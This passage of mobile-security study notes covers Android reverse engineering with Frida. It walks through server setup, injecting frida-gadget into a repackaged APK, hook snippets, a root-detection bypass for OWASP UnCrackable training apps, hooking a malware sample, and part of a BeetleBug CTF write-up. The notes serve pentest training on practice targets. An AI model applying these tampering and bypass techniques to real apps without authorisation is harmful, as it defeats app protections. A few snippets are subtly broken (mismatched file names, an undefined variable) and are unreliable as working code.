<pre><code class="language-shell">$ frida -U -l myscript.js com.android.chrome
</code></pre>
<ul>
<li>Here is an example allowing to hook the onCreate function</li>
</ul>
<pre><code class="language-Javascript">Java.perform(function () {
    // Declare the Activity class as a variable
    var Activity = Java.use(&quot;android.app.Activity&quot;);
    
    // Hook the onCreate function
    Activity.onCreate.implementation = function () {
        console.log(&quot;[*] onCreate() got called!&quot;);
        this.onCreate();
    };
});
</code></pre>
<ul>
<li>When spawning an application, it is recommended to use Java.available as follow
<ul>
<li>Sometimes the JVM is not ready, and the script failed to execute</li>
</ul>
</li>
</ul>
<pre><code class="language-Javascript">if(Java.available) {
    Java.perform(function () {
        // your code here
    };
}
</code></pre>
<ul>
<li>To print debug messages, you can use those functions </li>
</ul>
<pre><code class="language-shell">$ send(message)
$ console.log(line) / console.warn(line) / console.error(line)
</code></pre>
<h2 id="reference"><a class="header" href="#reference">Reference</a></h2>
<ul>
<li>Cheat Sheet
<ul>
<li><a href="https://learnfrida.info/">Frida Handbook</a></li>
<li>Intigriti
<ul>
<li><a href="https://github.com/carlospolop/hacktricks/blob/master/mobile-pentesting/android-app-pentesting/frida-tutorial/README.md">Github</a></li>
<li><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/frida-tutorial">Blog</a></li>
</ul>
</li>
<li><a href="https://www.varutra.com/android-pentesting-using-frida/">Android Pentesting Using Frida</a></li>
<li><a href="https://braincoke.fr/blog/2021/03/android-reverse-engineering-for-beginners-frida/#about-frida">Android reverse engineering for beginners - Frida</a></li>
<li><a href="https://nibarius.github.io/learning-frida/">Learning Frida</a></li>
<li><a href="https://frida.re/docs/examples/android/">Frida Home</a></li>
</ul>
</li>
<li><a href="https://codeshare.frida.re/">Awesome Frida scripts</a></li>
<li><a href="https://nibarius.github.io/learning-frida/">Learning Frida</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frida-setup"><a class="header" href="#frida-setup">Frida setup</a></h1>
<p>Frida can installed : </p>
<ul>
<li>Rooted device(s)</li>
<li><a href="tools/android/frida/setup/./NotRooted/index.html">Not rooted device(s)</a></li>
<li><a href="tools/android/frida/setup/./emulator/index.html">Emulator(s)</a></li>
</ul>
<h3 id="setup-python-modules"><a class="header" href="#setup-python-modules">Setup python modules</a></h3>
<p>Sous python 3.9 et plus</p>
<pre><code class="language-shell"># Pyenv or venv
$ pip install frida-tools
$ pip install frida
</code></pre>
<h3 id="get-frida-server"><a class="header" href="#get-frida-server">Get Frida server</a></h3>
<pre><code class="language-bash">VER=`frida --version`
ABI=`adb shell getprop ro.product.cpu.abi`
wget https://github.com/frida/frida/releases/download/$VER/frida-server-$VER-android-$ABI.xz
xz -d frida-server-$VER-android-$ABI.xz
mv frida-server-* frida-server
</code></pre>
<p>Where : </p>
<ul>
<li><code>VERSION</code> is the last version (16.0.19 at Apr 27 2023)</li>
<li><code>PLATFORM</code> is one of [<code>android</code>|<code>windows</code>|<code>linux</code>]. This is the device target.</li>
<li><code>ARCHI</code> is [<code>arm</code>|<code>arm64</code>|<code>x86</code>|<code>x86_64</code>|<code>armeabi</code>]</li>
</ul>
<h3 id="get-frida-gadget"><a class="header" href="#get-frida-gadget">Get Frida gadget</a></h3>
<pre><code class="language-bash">VER=`frida --version`
ABI=`adb shell getprop ro.product.cpu.abi`
wget https://github.com/frida/frida/releases/download/$VER/frida-gadget-$VER-android-$ABI.so.xz
xz -d frida-server-$VER-android-$ABI.xz
mv frida-server-* frida-server
</code></pre>
<p>Where : </p>
<ul>
<li><code>VERSION</code> is the last version (16.0.19 at Apr 27 2023)</li>
<li><code>PLATFORM</code> is one of [<code>android</code>|<code>windows</code>|<code>linux</code>]. This is the device target.</li>
<li><code>ARCHI</code> is [<code>arm</code>|<code>arm64</code>|<code>x86</code>|<code>x86_64</code>|<code>armeabi</code>]</li>
</ul>
<h3 id="run-frida-server"><a class="header" href="#run-frida-server">Run frida server</a></h3>
<pre><code class="language-shell"># Restart root
$ adb root
adbd is running as root
$ adb push frida-server /data/local/tmp/
frida-server: 1 file pushed, 0 skipped. 318.4 MB/s (112503224 bytes in 0.337s)
$ adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;
$ adb shell &quot;/data/local/tmp/frida-server -D &amp;&quot; 
</code></pre>
<h3 id="get-running-process-list"><a class="header" href="#get-running-process-list">Get running process list</a></h3>
<pre><code class="language-shell"># List packages and processes
$ frida-ps -U 
# Get all the package name
$ frida-ps -U | grep -i &lt;part_of_the_package_name&gt;
</code></pre>
<h3 id="run-client-script"><a class="header" href="#run-client-script">Run client script</a></h3>
<pre><code class="language-shell">frida -U -l &lt;script&gt;.js -f &lt;package_name&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="inject-fridas-gadget-under-android-not-rooted-device"><a class="header" href="#inject-fridas-gadget-under-android-not-rooted-device">Inject Frida's <em>Gadget</em> under Android: Not rooted device</a></h1>
<ul>
<li>Ref: <a href="https://fadeevab.com/frida-gadget-injection-on-android-no-root-2-methods/">Frida's Gadget Injection on Android: No Root, 2 Methods - Alexandr Fadeev</a></li>
</ul>
<p><img src="tools/android/frida/setup/NotRooted/./frida-gadget-injection-dark.png" alt="Architecture" /></p>
<p>You have 2 options to inject Frida's Gadget to Android application: </p>
<ol>
<li>
<p><strong>Method 1</strong>: If targeted APK contains any native library (<code>&lt;apk&gt;/lib/arm64-v8a/libfromapk.so</code>), then you can inject libfrida-gadget.so as a dependency into the native library.</p>
</li>
<li>
<p><strong>Method 2</strong>: If APK doesn't contain a native library, then you can inject <code>System.loadLibrary</code> bytecode.</p>
<pre><code> Only method 1 will be used here
</code></pre>
</li>
</ol>
<h2 id="method-1--inject-a-libfrida-gadgetso-as-a-dependency-to-a-native-library-jni-inside-of-apk"><a class="header" href="#method-1--inject-a-libfrida-gadgetso-as-a-dependency-to-a-native-library-jni-inside-of-apk">Method 1 : Inject a <code>libfrida-gadget.so</code> as a dependency to a native library (JNI) inside of APK</a></h2>
<p>The used APK coming from github project <a href="https://github.com/Wirtos/cdroid.git">cdroid</a> where 2 APK were generated : </p>
<ul>
<li>first with &quot;android.permission.INTERNET&quot;</li>
<li>second without this permission.</li>
</ul>
<p>Basically, you need this article: <a href="https://lief.quarkslab.com/doc/stable/tutorials/09_frida_lief.html">How to use frida on a non-rooted device - LIEF</a>.</p>
<ol>
<li>Download and unpack frida-gadget &gt;= 12.8.8 for Android for arm64 </li>
</ol>
<p>!!! les versions 12.7.0 à 12.8.7 ne parviennet pas à contacter le serveur <a href="https://github.com/frida/frida-core/issues/286">Issue#286</a>.</p>
<pre><code class="language-shell">$ wget https://github.com/frida/frida/releases/download/16.1.4/frida-gadget-16.1.4-android-arm64.so.xz
$ unxz -d frida-gadget-16.1.4-android-arm64.so.xz
</code></pre>
<ol start="2">
<li><em>Unpack</em> APK</li>
</ol>
<pre><code class="language-shell">$ apktool d -rs &lt;target&gt;.apk
</code></pre>
<ul>
<li>Use apktool &gt;= 2.4.1.</li>
<li><code>-rs</code> is to not decode resources and sources, it will save you time and keep your nerves while compiling the APK back.</li>
<li><strong>unzip/zip</strong> doesn't always work - application may not bring up.</li>
</ul>
<ol start="3">
<li>Copy frida-gadget to the unpacked APK directory.</li>
</ol>
<pre><code class="language-shell">$ cp frida-gadget-16.1.4-android-arm64.so target/lib/arm64-v8a/libfrida-gadget.so
</code></pre>
<ol start="4">
<li>Patch library with the following script</li>
</ol>
<pre><code class="language-python">#!/usr/bin/env python3

import lief

libnative = lief.parse(&quot;target/lib/arm64-v8a/libfromapk.so&quot;)
libnative.add_library(&quot;libfrida-gadget.so&quot;) # Injection!
libnative.write(&quot;target/lib/arm64-v8a/libfromapk.so&quot;)
</code></pre>
<ol start="5">
<li>Check the injection succeeded.</li>
</ol>
<pre><code class="language-shell">$ readelf -d target/lib/arm64-v8a/libfromapk.so

Dynamic section at offset 0xb2220 contains 30 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libfrida-gadget.so]
...
</code></pre>
<ol start="6">
<li>Re-pack APK.</li>
</ol>
<pre><code class="language-shell">apktool b &lt;target&gt;
</code></pre>
<p>&amp;. Sign APK</p>
<p>used &quot;Uber APK signer&quot;: <a href="https://github.com/patrickfav/uber-apk-signer">uber-apk-signer</a></p>
<pre><code class="language-shell">$ java -jar uber-apk-signer-1.1.0.jar -a ./target/dist/target.apk
</code></pre>
<ol start="5">
<li>Install l'APK</li>
</ol>
<pre><code class="language-shell">$ adb install -r -g &lt;apk_file&gt;.apk
</code></pre>
<h2 id="check-frida-gadget"><a class="header" href="#check-frida-gadget">Check <em>frida-gadget</em></a></h2>
<ol>
<li>Print log </li>
</ol>
<pre><code class="language-shell">$ adb logcat | grep -i frida
XX-XX XX:XX:XX.XXX 17595 17618 I Frida   : Listening on 127.0.0.1 TCP port 27042
</code></pre>
<ol start="2">
<li>Check openning port</li>
</ol>
<pre><code class="language-shell">$ adb shell netstat -ln | grep 27042
tcp        0      0 127.0.0.1:27042         0.0.0.0:*               LISTEN
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frida-1"><a class="header" href="#frida-1">Frida</a></h1>
<h2 id="frida-setup-1"><a class="header" href="#frida-setup-1">Frida Setup</a></h2>
<pre><code>Sous python 3.9 et plus
</code></pre>
<h3 id="setup-python-modules-1"><a class="header" href="#setup-python-modules-1">Setup python modules</a></h3>
<pre><code class="language-shell"># Pyenv or venv
$ pip install frida-tools
$ pip install frida
</code></pre>
<h3 id="get-frida-server-1"><a class="header" href="#get-frida-server-1">Get Frida server</a></h3>
<pre><code class="language-shell">$ wget https://github.com/frida/frida/releases/download/VERSION/frida-server-VERSION-PLATFORM-ARCHI.xz 
</code></pre>
<p>Where : </p>
<ul>
<li><code>VERSION</code> is the last version (16.0.19 at Apr 27 2023)</li>
<li><code>PLATFORM</code> is one of [<code>android</code>|<code>windows</code>|<code>linux</code>]. This is the device target.</li>
<li><code>ARCHI</code> is [<code>arm</code>|<code>arm64</code>|<code>x86</code>|<code>x86_64</code>|<code>armeabi</code>]</li>
</ul>
<p>Example:</p>
<p>For <code>Pixel 5, Android 12,  API 31 emulator</code> (from Android studio).</p>
<pre><code class="language-shell">$ wget https://github.com/frida/frida/releases/download/16.0.19/frida-server-16.0.19-android-x86_64.xz
$ xz --decompress frida-server-16.0.19-android-x86_64.xz
$ mv frida-server-* frida-server
</code></pre>
<h3 id="run-frida-server-1"><a class="header" href="#run-frida-server-1">Run frida server</a></h3>
<pre><code class="language-shell"># Restart root
$ adb root
adbd is running as root
$ adb push frida-server /data/local/tmp/
frida-server: 1 file pushed, 0 skipped. 318.4 MB/s (112503224 bytes in 0.337s)
$ adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;
$ adb shell &quot;/data/local/tmp/frida-server -D &amp;&quot; 
</code></pre>
<h3 id="get-running-process-list-1"><a class="header" href="#get-running-process-list-1">Get running process list</a></h3>
<pre><code class="language-shell"># List packages and processes
$ frida-ps -U 
# Get all the package name
$ frida-ps -U | grep -i &lt;part_of_the_package_name&gt;
</code></pre>
<h3 id="run-client-script-1"><a class="header" href="#run-client-script-1">Run client script</a></h3>
<pre><code class="language-shell">frida -U -l &lt;script&gt;.js -f &lt;package_name&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-emulatorfrida"><a class="header" href="#android-emulatorfrida">Android Emulator/Frida</a></h1>
<p>Inspired from <a href="https://www.youtube.com/@lauriewired">Lairue Wired</a></p>
<h2 id="docker"><a class="header" href="#docker">Docker</a></h2>
<ul>
<li>Docker pul</li>
</ul>
<blockquote>
<p>docker pull budtmo/docker-android:latest</p>
</blockquote>
<p><a href="https://github.com/budtmo/docker-android">docker-android</a></p>
<ul>
<li>Docker run</li>
</ul>
<pre><code class="language-shell"># docker run --privileged -d -p 6080:6080 -p 5554:5554 -p 5555:5555 -e DEVICE=&quot;Samsung Galaxy S6&quot; --name android-container budtmo/docker-android-x86-8.1
$ docker run -d -p 6080:6080 -p 5554:5554 -p 5555:5555 -e EMULATOR_DEVICE=&quot;Samsung Galaxy S10&quot; -e WEB_VNC=true --device /dev/kvm --name android-container budtmo/docker-android:latest
</code></pre>
<ul>
<li>Connect to shell</li>
</ul>
<pre><code class="language-shell">➜ adb connect 127.0.0.1:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 127.0.0.1:5555
➜ adb -s 127.0.0.1:5555 shell       
emu64xa:/ $
➜ adb -s 127.0.0.1:5555 root
restarting adbd as root
➜ adb -s 127.0.0.1:5555 shell 
emu64xa:/ # 
</code></pre>
<h2 id="setup-frida"><a class="header" href="#setup-frida">Setup Frida</a></h2>
<pre><code class="language-shell">➜ pip show frida
Name: frida
Version: 16.1.4
Summary: Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers
Home-page: https://frida.re
Author: Frida Developers
Author-email: oleavr@frida.re
License: wxWindows Library Licence, Version 3.1
Location: /home/user/.pyenv/versions/3.10.10/envs/frida_env/lib/python3.10/site-packages
Requires: typing-extensions
Required-by: frida-tools
</code></pre>
<ul>
<li>For the emulator =&gt; Frida server <code>x86</code></li>
</ul>
<pre><code class="language-shell">➜ unxz frida-server-16.1.4-android-x86_64.xz
➜ adb -s 127.0.0.1:5555 push frida-server-16.1.4-android-x86_64 /data/local/tmp
frida-server-16.1.4-android-x86_64: 1 file pushed, 0 skipped. 46.9 MB/s (51624572 bytes in 1.050s)
➜ adb -s 127.0.0.1:5555 shell 
emu64xa:/ # cd /data/local/tmp
127|emu64xa:/data/local/tmp # ls
frida-server-16.1.4-android-x86_64
128|emu64xa:/data/local/tmp # chmod +x ./frida-server-16.1.4-android-x86_64
➜ adb -s 127.0.0.1:5555 shell /data/local/tmp/frida-server-16.1.4-android-x86_64 -D &amp;
[1] 690322
➜ adb -s 127.0.0.1:5555 shell                                                        
1|emu64xa:/ # netstat -tlp                                                                                            
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp        0      0 localhost:27042         0.0.0.0:*               LISTEN      6435/frida-server-16.1.4-android-x86_64
tcp        0      0 10.0.2.16:43826         par10s41-in-f4.1e:https CLOSE_WAIT  2550/com.google.android.googlequicksearchbox:search
tcp        0      0 10.0.2.16:41458         par10s41-in-f4.1e:https CLOSE_WAIT  2550/com.google.android.googlequicksearchbox:search
tcp6       0      0 [::]:5555               [::]:*                  LISTEN      6152/adbd
tcp6       0      0 ::ffff:10.0.2.16:46468  wl-in-f188.1e100.n:5228 ESTABLISHED 5168/com.google.android.gms.persistent
</code></pre>
<h2 id="frida-quick-start"><a class="header" href="#frida-quick-start">Frida quick start</a></h2>
<ul>
<li>Running process list </li>
</ul>
<blockquote>
<p>frida-ps -U</p>
</blockquote>
<ul>
<li>Running application</li>
</ul>
<blockquote>
<p>frida-ps -Ua</p>
</blockquote>
<ul>
<li>Attach to a process</li>
</ul>
<pre><code class="language-shell">➜ frida-ps -Ua   
 PID  Name         Identifier                             
----  -----------  ---------------------------------------
2550  Google       com.google.android.googlequicksearchbox
2550  Google       com.google.android.googlequicksearchbox
5482  Messages     com.google.android.apps.messaging      
1581  Phone        com.google.android.dialer              
6074  Photos       com.google.android.apps.photos         
1085  SIM Toolkit  com.android.stk                        
6041  Settings     com.android.settings
6499  YouTube      com.google.android.youtube             
➜ frida -U Youtube
     ____
    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to sdk gphone x86 64 (id=127.0.0.1:5555)
                                                                                
[sdk gphone x86 64::Youtube ]-&gt; Exit
</code></pre>
<h2 id="sample"><a class="header" href="#sample">Sample</a></h2>
<ul>
<li>Name: <a href="https://bazaar.abuse.ch/sample/c81234b6ceb3572c6d862a9313e019b98efd83165d8c085bd3e74971c66763bb/">Android</a></li>
<li>SHA256: c81234b6ceb3572c6d862a9313e019b98efd83165d8c085bd3e74971c66763bb</li>
<li>ZIP password: infected</li>
</ul>
<h3 id="script-to-hook"><a class="header" href="#script-to-hook">Script to hook</a></h3>
<pre><code class="language-js">Java.perform(() =&gt; {
    const wwuClass = Java.use('com.first.smoke.WWuToNtMwQcZlXnFwNx');

    wwuClass.arrivesample.implementation = function () {
        send('arrivesample() got called! Let\'s call the original implementation');
        var retValue = this.arrivesample();
        send('arrivesample() got called! Let\'s call the original implementation');
        return retValue;
    };
});
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frida-snippet-code"><a class="header" href="#frida-snippet-code">Frida Snippet Code</a></h1>
<h2 id="skeleton"><a class="header" href="#skeleton">Skeleton</a></h2>
<pre><code class="language-python">if (Java.available) {
  Java.perform(function() {
    # Code python
  }
}
</code></pre>
<h2 id="methods-call"><a class="header" href="#methods-call">Methods call</a></h2>
<ul>
<li>Static method</li>
</ul>
<pre><code class="language-javascript">var BasicTypes = Java.use(&quot;com.blog.testfrida.examples.BasicTypes&quot;); 
BasicTypes.divideFloat(23,3);
</code></pre>
<ul>
<li>Non static method</li>
</ul>
<pre><code class="language-javascript">// Class reference
var Person = Java.use(&quot;com.blog.testfrida.complexobjects.Person&quot;);
// Create instance
var personInstance = Person.$new(); 
</code></pre>
<ul>
<li>Send string parameters to function</li>
</ul>
<pre><code class="language-javascript">var String = Java.use(&quot;java.lang.String&quot;); 
personInstance.setName(String.$new(&quot;Peter Griffin&quot;));
</code></pre>
<h3 id="overridden-methods"><a class="header" href="#overridden-methods">Overridden methods</a></h3>
<p>Here is overridden methods: </p>
<pre><code class="language-java">public static int multiply(int val1, int val2) {
    return val1 * val2;
}

public static byte multiply(byte val1, byte val2) {
    return (byte) (val1 * val2);
}
</code></pre>
<ul>
<li>Use in javascript will be:</li>
</ul>
<pre><code class="language-javascript">var BasicTypes = Java.use(&quot;com.blog.testfrida.examples.BasicTypes&quot;); 
console.log(BasicTypes.multiply(3,5));
</code></pre>
<p>Frida solves the method by the argument types.</p>
<ul>
<li>Override methods</li>
</ul>
<pre><code class="language-javascript">var BasicTypes = Java.use(&quot;com.blog.testfrida.examples.BasicTypes&quot;); 
console.log(BasicTypes.multiply(3,5));

// Failed to used this methods: which ones we are overridern
// BasicTypes.multiply.implementation = function (val1, val2) {
//    console.log(&quot;it works&quot;);
//    return val1 * val2;
//}
BasicTypes.multiply.overload('int','int').implementation = function (val1, val2) {
    return val1 * val2;
}
</code></pre>
<h2 id="trace-class"><a class="header" href="#trace-class">Trace class</a></h2>
<h3 id="list-all-overwritten-methods-and-get-count"><a class="header" href="#list-all-overwritten-methods-and-get-count">List all overwritten methods and get count</a></h3>
<pre><code class="language-javascript">function traceClass(targetClass) {
    var hook;
    try {
        hook = Java.use(targetClass);
    } catch (e) {
        console.error(&quot;trace class failed&quot;, e);
        return;
    }

    var methods = hook.class.getDeclaredMethods();
    hook.$dispose();

    var parsedMethods = [];
    methods.forEach(function (method) {
        var methodStr = method.toString();
        var methodReplace = methodStr.replace(targetClass + &quot;.&quot;, &quot;TOKEN&quot;).match(/\sTOKEN(.*)\(/)[1];
         parsedMethods.push(methodReplace);
    });

    uniqBy(parsedMethods, JSON.stringify).forEach(function (targetMethod) {
        traceMethod(targetClass + '.' + targetMethod);
    });
}

function traceMethod(targetClassMethod) {
    var delim = targetClassMethod.lastIndexOf('.');
    if (delim === -1)
        return;

    var targetClass = targetClassMethod.slice(0, delim);
    var targetMethod = targetClassMethod.slice(delim + 1, targetClassMethod.length);

    var hook = Java.use(targetClass);
    var overloadCount = hook[targetMethod].overloads.length;

    console.log(targetClassMethod + &quot; (overloadCount: &quot; + overloadCount + &quot;)&quot;);
}

// remove duplicates from array
function uniqBy(array, key) {
    var seen = {};
    return array.filter(function (item) {
        var k = key(item);
        return seen.hasOwnProperty(k) ? false : (seen[k] = true);
    });
}
</code></pre>
<ul>
<li>Usage</li>
</ul>
<pre><code class="language-javascript">traceClass(&quot;java.lang.String&quot;);
</code></pre>
<h3 id="list-overwritten-methods"><a class="header" href="#list-overwritten-methods">List overwritten methods</a></h3>
<pre><code class="language-javascript">function listOverritenMethods(className, func) {
    var Class = Java.use(className);
    var overloadedMethods = Class[func].overloads;
    for (var i in overloadedMethods) {
        console.log(overloadedMethods[i]);
    }
}
</code></pre>
<ul>
<li>Usage </li>
</ul>
<pre><code class="language-javascript">listOverritenMethods(&quot;java.lang.String&quot;, &quot;getBytes&quot;);
</code></pre>
<h2 id="function-substitution"><a class="header" href="#function-substitution">Function substitution</a></h2>
<ul>
<li>Code that detect 'root'</li>
</ul>
<pre><code class="language-smali">protected void onCreate(Bundle paramBundle)
{
    if (sg.vantagepoint.a.c.c()) {
        a(&quot;Root detected!&quot;);
    }
  ...
</code></pre>
<ul>
<li>Frida Script</li>
</ul>
<pre><code class="language-javascript">Java.perform(function () {
    let theClass = Java.use(&quot;sg.vantagepoint.a.c&quot;);
    theClass.a.implementation = function(v) {
        console.log(&quot;In function A&quot;);
        return false
    }
})
</code></pre>
<p>or </p>
<pre><code class="language-javascript">Java.perform(function () {
    let MainActivity = Java.use(&quot;sg.vantagepoint.uncrackable.MainActivity&quot;);
    MainActivity.a.overload('java.lang.String').implementation = function (str) {
        console.log(`MainActivity.a is called: str=${str}`);
    };
})
</code></pre>
<h2 id="decode-bytes-to-string"><a class="header" href="#decode-bytes-to-string">Decode bytes to string</a></h2>
<pre><code class="language-javascript">// Helper function to decode byte[] to String
function arrToStr(byteArr) {
    var tmp = &quot;&quot;;
    for (var k = 0; k &lt; byteArr.length; k++) {
    tmp += String.fromCharCode(byteArr[k]);
    }
    return tmp;
}
</code></pre>
<h2 id="exported-imported-and-symbols-from-module"><a class="header" href="#exported-imported-and-symbols-from-module">Exported, imported and symbols from module</a></h2>
<ul>
<li>Lists all names (exports, imports and symbols) in the given module.
If a 'needle' is given this function returns the address of the name that matches the 'needle'</li>
</ul>
<pre><code class="language-javascript">function listNames(module, needle) {
    var address = undefined;
    Process.enumerateModules()
        .filter(function (m) { return m[&quot;path&quot;].toLowerCase().indexOf(module) != -1; })
        .forEach(function (mod) {
            mod.enumerateExports().forEach(function (entry) {
                console.log(&quot;Export: &quot; + entry.name);
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
            mod.enumerateImports().forEach(function (entry) {
                console.log(&quot;Import: &quot; + entry.name);
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
            mod.enumerateSymbols().forEach(function (entry) {
                console.log(&quot;symbol name: &quot; + entry.name);
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
        });
    console.log(&quot;&quot;);
    return address;
}
</code></pre>
<h2 id="hook-function-in-library"><a class="header" href="#hook-function-in-library">Hook function in library</a></h2>
<ul>
<li>An <code>libfoo.so</code> use <code>strncmp</code> function.</li>
</ul>
<pre><code class="language-javascript">function listNames(module, needle) {
    var address = undefined;
    Process.enumerateModules()
        .filter(function (m) { return m[&quot;path&quot;].toLowerCase().indexOf(module) != -1; })
        .forEach(function (mod) {
            mod.enumerateExports().forEach(function (entry) {
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
            mod.enumerateImports().forEach(function (entry) {
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
            mod.enumerateSymbols().forEach(function (entry) {
                if (entry.name.indexOf(needle) != -1) address = entry.address;
            });
        });
    return address;
}

function attachToStrncmp(strncmpAddress, compareTo) {
    Interceptor.attach(strncmpAddress, {
        onEnter: function (args) {
            var len = compareTo.length;
            if (args[2].toInt32() != len) {return;}
            var str1 = args[0].readUtf8String(len)
            var str2 = args[1].readUtf8String(len)
            if (str1 == compareTo || str2 == compareTo) {
                console.log(&quot;strncmp(&quot; + str1 + &quot;, &quot; + str2 + &quot;, &quot; + len + &quot;) called&quot;);
            }
        },
    });
}

Java.perform(function () {
    Java.use(&quot;&lt;MODULE&gt;.MainActivity&quot;).onResume.implementation = function () {
        this.onResume();

        // Hook to strncmp and look for any calls to it with the magic word as argument
        var watchDog = &lt;STRING_UNIQUE_2_DISTNGUISHED_CALL&gt;;
        var strncmp_addr = listNames('libfoo.so', 'strncmp')
        attachToStrncmp(strncmp_addr, theMagicWord);

        // Find the CodeCheck instance that was created by the app in onCreate()
        // Then call it with the magic word as argument.
        Java.choose(&quot;CLASS_MODULE&quot;, {
            onMatch: function (instance) {
                instance.&lt;FCT_IN_CLASS&gt;(
                    Java.use(&quot;java.lang.String&quot;).$new(watchDog)
                );
                return &quot;stop&quot;;  // return 'stop'
            },
            onComplete: function () { }
        });

        // We've got what we wanted, detach again to prevent multiple attachments
        // to strncmp if onResume is called multiple times.
        Interceptor.detachAll();
    }
})
</code></pre>
<h2 id="other-snippet"><a class="header" href="#other-snippet">Other Snippet</a></h2>
<ul>
<li>
<p><a href="https://www.shielder.com/it/blog/2019/02/fridalab-writeup/">FridaLab – Writeup</a></p>
</li>
<li>
<p><a href="https://github.com/iddoeldor/frida-snippets#class-description">iddoeldor/frida-snippets [EXCELLENT]</a></p>
</li>
<li>
<p><a href="https://nibarius.github.io/learning-frida/2020/05/23/uncrackable2">Solving OWASP MSTG UnCrackable App for Android Level 2</a></p>
</li>
<li>
<p><a href="https://cmrodriguez.me/blog/frida-scripting-guide/">Frida Scripting Guide for Java</a></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frida-tutorials"><a class="header" href="#frida-tutorials">Frida Tutorials</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hacktricks"><a class="header" href="#hacktricks">hacktricks</a></h1>
<h2 id="android-hacking-with-frida"><a class="header" href="#android-hacking-with-frida"><a href="https://joshspicer.com/android-frida-1">Android Hacking with FRIDA</a></a></h2>
<h2 id="ref"><a class="header" href="#ref">Ref</a></h2>
<ul>
<li><a href="https://medium.com/infosec-adventures/introduction-to-frida-5a3f51595ca1">tuto1</a>
<ul>
<li><a href="https://medium.com/infosec-adventures/introduction-to-frida-5a3f51595ca1">From</a></li>
<li><a href="https://github.com/t0thkr1s/frida-demo/releases">APK</a></li>
<li><a href="https://github.com/t0thkr1s/frida-demo">Source Code</a></li>
</ul>
</li>
<li><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2">tuto2</a>
<ul>
<li><a href="https://11x256.github.io/Frida-hooking-android-part-2/">From</a></li>
<li><a href="https://github.com/11x256/frida-android-examples">APK and source</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="uncrackable-mobile-apps"><a class="header" href="#uncrackable-mobile-apps">UnCrackable Mobile Apps</a></h1>
<p>These are the UnCrackable Apps for Android and iOS, a collection of mobile reverse engineering challenges. These challenges are used as examples throughout the OWASP MASTG. Of course, you can also solve them for fun.</p>
<p>See https://mas.owasp.org/crackmes for more information.</p>
<ul>
<li><a href="https://github.com/OWASP/owasp-mastg/tree/master/Crackmes/Android">Android</a>
<ul>
<li><a href="https://github.com/OWASP/owasp-mastg/blob/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk">Level 1</a></li>
<li><a href="https://github.com/OWASP/owasp-mastg/blob/master/Crackmes/Android/Level_02/UnCrackable-Level2.apk">Level 2</a></li>
<li><a href="https://github.com/OWASP/owasp-mastg/blob/master/Crackmes/Android/Level_03/UnCrackable-Level3.apk">Level 3</a></li>
<li>Level 4
<ul>
<li>[v0.9](https://github.com/OWASP/owasp-mastg/blob/master/
Crackmes/Android/Level_04/r2pay-v0.9.apk)</li>
<li><a href="https://github.com/OWASP/owasp-mastg/blob/master/Crackmes/Android/Level_04/r2pay-v1.0.apk">v1.0</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><pre><code>▛▀▖      ▐  ▜    ▛▀▖      
▙▄▘▞▀▖▞▀▖▜▀ ▐ ▞▀▖▙▄▘▌ ▌▞▀▌
▌ ▌▛▀ ▛▀ ▐ ▖▐ ▛▀ ▌ ▌▌ ▌▚▄▌
▀▀ ▝▀▘▝▀▘ ▀  ▘▝▀▘▀▀ ▝▀▘▗▄▘
</code></pre>
<p>Training APK. Contains multilevel training.</p>
<h1 id="hardcoded-secrets"><a class="header" href="#hardcoded-secrets">Hardcoded Secrets</a></h1>
<h2 id="flag-1---hardcoding-sensitive-data"><a class="header" href="#flag-1---hardcoding-sensitive-data">Flag 1 - Hardcoding Sensitive Data</a></h2>
<p>Goal: To unlock secret folder =&gt; Find strings</p>
<p>Use <a href="tools/android/frida/tutorials/BeetleBug/src/tools/android/ApkLab/index.html">ApkLab</a> to open apk files. Activate options:</p>
<ol>
<li>decompile Java</li>
<li>Find &quot;Enter PIN&quot; =&gt; res/layout/activity_embedded_secret_strings.xml
<ol>
<li>Ref a resource &quot;editTextSecretPin&quot;. looking for <code>findViewById(*editTextSecretPin*) =&gt; </code>java_src/app/beetlebug/ctf/EmbeddedSecretStrings.java`</li>
</ol>
</li>
</ol>
<pre><code class="language-java">embeddedSecretStrings.pin = (EditText) embeddedSecretStrings.findViewById(C0670R.C0673id.editTextSecretPin);
String s1 = EmbeddedSecretStrings.this.pin.getText().toString();
if (s1.equals(EmbeddedSecretStrings.this.getString(C0670R.string.V98bFQrpGkDJ))) {
    SharedPreferences.Editor editor = EmbeddedSecretStrings.this.sharedPreferences.edit();
    editor.putFloat(&quot;ctf_score_secret_string&quot;, 6.25f);
</code></pre>
<p>Looking for <code>string.V98bFQrpGkDJ</code> into resource file <code>string.xml</code> =&gt; <code>res/values/strings.xml</code></p>
<pre><code class="language-xml">  &lt;string name=&quot;V98bFQrpGkDJ&quot;&gt;7432580&lt;/string&gt;
</code></pre>
